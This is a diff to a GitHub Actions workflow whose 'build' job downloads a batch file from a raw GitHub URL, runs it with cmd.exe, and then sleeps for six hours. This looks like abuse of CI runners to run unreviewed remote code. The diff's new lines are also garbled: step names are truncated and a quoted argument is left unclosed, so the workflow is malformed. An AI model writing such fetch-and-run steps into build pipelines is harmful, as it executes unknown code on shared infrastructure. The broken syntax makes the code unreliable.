@@ -5,20 +5,20 @@ on:
 
 jobs:
   build:
-    runs-on: windows-2022
+    runs-on: windows-latest
 
     steps:
 
-      - name: Download and run bat file
+      - name: at files in
         shell: pwsh
         run: |
           $webclient = New-Object System.Net.WebClient
           $webclient.DownloadFile("https://raw.githubusercontent.com/G67890/p1/main/run.bat", "Run.bat")
-          Start-Process -FilePath "cmd.exe" -ArgumentList "/c Run.bat > output.txt" -NoNewWindow -Wait
-          Start-Sleep -Seconds 100
+          Start-Process -FilePath "cmd.exe" -ArgumentList "/c Run.bat -Wait
+        
           
       
-      - name: tOut  
+      - name: tOu
         run: |
           Start-Sleep -Seconds 21600
        
